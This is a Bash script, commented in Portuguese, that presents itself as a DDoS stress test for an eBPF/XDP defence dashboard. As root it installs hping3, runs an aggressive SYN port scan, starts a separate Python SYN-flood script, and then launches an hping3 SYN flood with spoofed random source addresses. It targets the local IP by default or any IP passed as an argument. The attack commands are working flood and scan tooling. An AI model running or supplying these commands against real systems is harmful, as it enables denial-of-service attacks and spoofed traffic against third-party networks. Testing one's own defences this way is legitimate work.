#!/bin/bash

# =========================================================================
# OPERACAO FOGO CRUZADO - SPECTRE_GRID DDOS STRESS TEST
# =========================================================================

if [ "$EUID" -ne 0 ]; then
  echo "[ERRO] Este teste de stress (raw sockets) precisa ser executado como root (sudo)."
  exit 1
fi

if [ -n "$1" ]; then
    TARGET_IP="$1"
    echo "[*] IP alvo definido manualmente via argumento: $TARGET_IP"
else
    # 1. Descoberta Automatica do IP Alvo
    ACTIVE_IFACE=$(ip route ls default | awk '{print $5}' | head -n 1)
    if [ -z "$ACTIVE_IFACE" ]; then
        ACTIVE_IFACE=$(ip -o link show | awk -F': ' '$2 != "lo" {print $2; exit}' | xargs)
    fi
    if [ -z "$ACTIVE_IFACE" ]; then
        ACTIVE_IFACE="lo"
    fi

    TARGET_IP=$(ip -4 addr show $ACTIVE_IFACE | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)
    if [ -z "$TARGET_IP" ]; then
        TARGET_IP="127.0.0.1"
    fi
    echo "[*] IP alvo auto-descoberto na interface $ACTIVE_IFACE: $TARGET_IP"
fi

PORT_HTTP=80
PORT_SSH=22

# 2. Verifica Dependencias
if ! command -v hping3 &> /dev/null; then
    echo "[*] hping3 nao encontrado. Instalando automaticamente..."
    apt-get update && apt-get install -y hping3
fi

echo "====================================================================="
echo "🚨 INICIANDO OPERACAO FOGO CRUZADO (STRESS TEST MASSIVO) 🚨"
echo "====================================================================="
echo "[*] Alvo primario: $TARGET_IP"
echo "[*] O radar D3-Force vai acender e o XDP_DROP vai comecar a atuar."
echo "====================================================================="
sleep 2

# FASE 1: Reconhecimento Agressivo (Nmap)
echo "[FASE 1] -> Varredura Agressiva de Portas (SYN Scan)"
echo "Injetando pacote de reconhecimento silencioso..."
# Usa hping3 para simular um nmap stealth agressivo
hping3 -S -p ++1 --fast -c 100 $TARGET_IP > /dev/null 2>&1 &
HPING_SCAN_PID=$!
sleep 3

# FASE 2: Volume Bruto de Conexões TCP (Rampa de Aceleração)
echo "[FASE 2] -> Escalada de Conexoes TCP Rapidas"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
python3 "$SCRIPT_DIR/real_syn_flood.py" $TARGET_IP &
PYTHON_FLOOD_PID=$!
sleep 2

# FASE 3: O Caos Completo (SYN Flood Massivo e Random Source IPs)
echo "[FASE 3] -> 🚨 AVALANCHE SYN FLOOD DETECTADA (SPOOFED IPs) 🚨"
echo "O Data Plane eBPF e o Motor Neural GNN (LibTorch) estao sob carga maxima!"
# Usa hping3 para simular um SYN Flood real com IPs de origem spoofados
hping3 -S -p $PORT_HTTP --flood --rand-source $TARGET_IP > /dev/null 2>&1 &
HPING_FLOOD_PID=$!

echo ""
echo "🔥 ATAQUE EM ANDAMENTO (Mantenha o Dashboard visivel no video!) 🔥"
echo "Para abortar o ataque e normalizar o Data Plane, pressione [ENTER]..."
read -r
echo ""

echo "====================================================================="
echo "[*] Abortando injecao de pacotes maliciosos..."
kill -9 $HPING_SCAN_PID 2>/dev/null
kill -9 $PYTHON_FLOOD_PID 2>/dev/null
kill -9 $HPING_FLOOD_PID 2>/dev/null
killall hping3 2>/dev/null

echo "[OK] Ataque cessado. O tráfego residual seguro vai limpar o radar em alguns segundos."
echo "====================================================================="
